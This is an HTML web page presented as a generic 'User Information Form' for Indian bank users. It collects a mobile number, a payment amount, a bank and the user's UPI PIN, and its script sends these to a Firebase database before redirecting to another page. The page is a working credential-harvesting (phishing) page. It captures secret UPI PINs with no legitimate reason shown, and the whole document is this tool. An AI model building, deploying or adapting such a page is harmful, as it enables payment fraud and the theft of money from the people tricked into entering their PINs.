<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Information Form</title>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(to right, #4A00E0, #8E2DE2);
            color: white;
            padding: 25px;
            text-align: center;
        }

        .header h1 {
            font-size: 26px;
            margin-bottom: 8px;
        }

        .header p {
            opacity: 0.9;
            font-size: 14px;
        }

        .form-container {
            padding: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }

        input,
        select {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }

        input:focus,
        select:focus {
            outline: none;
            border-color: #8E2DE2;
            box-shadow: 0 0 0 3px rgba(142, 45, 226, 0.2);
        }

        .submit-btn {
            background: linear-gradient(to right, #4A00E0, #8E2DE2);
            color: white;
            border: none;
            padding: 16px;
            width: 100%;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            display: none;
        }

        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .footer {
            text-align: center;
            padding: 15px;
            font-size: 12px;
            color: #666;
            border-top: 1px solid #eee;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>User Information Form</h1>
            <p>Fill out the form below to save your information</p>
        </div>

        <div class="form-container">
            <form id="userForm">
                <div class="form-group">
                    <label for="mobile">Mobile Number</label>
                    <input 
                        type="tel" 
                        id="mobile" 
                        name="mobile" 
                        placeholder="Mobile Number" 
                        aria-required="true"
                        autocomplete="tel"
                        pattern="[0-9]{10}"
                        maxlength="10"
                        title="Please enter a valid 10 digit mobile number"
                        required 
                        inputmode="numeric" 
                    />
                </div>
                <div class="form-group">
                    <label for="amount">Payment Amount</label>
                    <input 
                        type="text"
                        inputmode="numeric" 
                        id="amount"
                        placeholder="Payment Amount" 
                        required
                    >
                </div>

                <div class="form-group">
                    <label for="bank">Select Bank</label>
                    <select id="bank" required>
                        <option value="" disabled selected>Select Bank:</option>
        <option value="sbi">State Bank of India</option>
        <option value="pnb">Punjab National Bank</option>
        <option value="bob">Bank of Baroda</option>
        <option value="canara">Canara Bank</option>
        <option value="union">Union Bank of India</option>
        <option value="indian">Indian Bank</option>
        <option value="central">Central Bank of India</option>
        <option value="iob">Indian Overseas Bank</option>
        <option value="boi">Bank of India</option>
        <option value="bom">Bank of Maharashtra</option>
        <option value="uco">UCO Bank</option>
        <option value="psb">Punjab & Sind Bank</option>
        <option value="hdfc">HDFC Bank</option>
        <option value="icici">ICICI Bank</option>
        <option value="axis">Axis Bank</option>
        <option value="kotak">Kotak Mahindra Bank</option>
        <option value="yes">YES Bank</option>
        <option value="indusind">IndusInd Bank</option>
        <option value="federal">Federal Bank</option>
        <option value="idfc_first">IDFC First Bank</option>
        <option value="rbl">RBL Bank</option>
        <option value="bandhan">Bandhan Bank</option>
        <option value="dcb">DCB Bank</option>
        <option value="karnatak">Karnataka Bank</option>
        <option value="kvb">Karur Vysya Bank</option>
        <option value="sib">South Indian Bank</option>
        <option value="tmb">Tamilnad Mercantile Bank</option>
        <option value="csb">CSB Bank</option>
        <option value="dhanlaxmi">Dhanlaxmi Bank</option>
        <option value="jkb">Jammu & Kashmir Bank</option>
        <option value="au_sf">AU Small Finance Bank</option>
        <option value="equitas_sf">Equitas Small Finance Bank</option>
        <option value="ujjivan_sf">Ujjivan Small Finance Bank</option>
        <option value="jana_sf">Jana Small Finance Bank</option>
        <option value="suryoday_sf">Suryoday Small Finance Bank</option>
        <option value="esaf_sf">ESAF Small Finance Bank</option>
        <option value="fincare_sf">Fincare Small Finance Bank</option>
        <option value="utkarsh_sf">Utkarsh Small Finance Bank</option>
        <option value="north_east_sf">North East Small Finance Bank</option>
        <option value="shivalik_sf">Shivalik Small Finance Bank</option>
        <option value="airtel_pb">Airtel Payments Bank</option>
        <option value="ippb">India Post Payments Bank</option>
        <option value="fino_pb">Fino Payments Bank</option>
        <option value="paytm_pb">Paytm Payments Bank</option>
        <option value="nsdl_pb">NSDL Payments Bank</option>
        <option value="jio_pb">Jio Payments Bank</option>
        <option value="Other">Other bank</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="pin">UPI Pin</label>
                    <input type="text" id="pin" placeholder="Enter Your Pin" inputmode="numeric" required>
                </div>

                <button type="submit" class="submit-btn">Submit Information</button>
            </form>

            <div id="message" class="message"></div>
        </div>
    </div>
    <script>
        // Firebase configuration
        const firebaseConfig = {
            databaseURL: "https://tsting-94dbc-default-rtdb.firebaseio.com"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Handle form submission
        document.getElementById('userForm').addEventListener('submit', function (e) {
            e.preventDefault();

            // Hide any previous messages
            document.getElementById('message').style.display = 'none';

            // Get form values
            const amount = document.getElementById('amount').value;
            const mobile = document.getElementById('mobile').value;
            const bank = document.getElementById('bank').value;
            const pin = document.getElementById('pin').value;

            // Validate mobile number
            if (!/^\d{10}$/.test(mobile)) {
                showMessage('Please enter a valid 10-digit mobile number', 'error');
                return;
            }

            // Validate payment amount
            if (!/^\d+$/.test(amount)) {
                showMessage('Please enter a valid payment amount (numbers only)', 'error');
                return;
            }

            // Validate UPI pin
            if (!/^\d+$/.test(pin)) {
                showMessage('Please enter a valid UPI pin (numbers only)', 'error');
                return;
            }

            // Create data object
            const userData = {
                amount: amount,
                mobile: mobile,
                bank: bank,
                pin: pin,
                timestamp: new Date().toISOString()
            };

            // Save to Firebase
            const newUserRef = database.ref('users').push();
            newUserRef.set(userData)
                .then(() => {
                    
                    // Reset form
                    document.getElementById('userForm').reset();

                  
                    setTimeout(() => {
                        window.location.href = "p.html";
                        
                    }, 500);
                })
                .catch((error) => {
                    console.error('Error saving data:', error);
                    showMessage('There was an error saving your information. Please try again.', 'error');
                });
        });

        // Function to show messages
        function showMessage(message, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = message;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
        }
    </script>
</body>
</html>
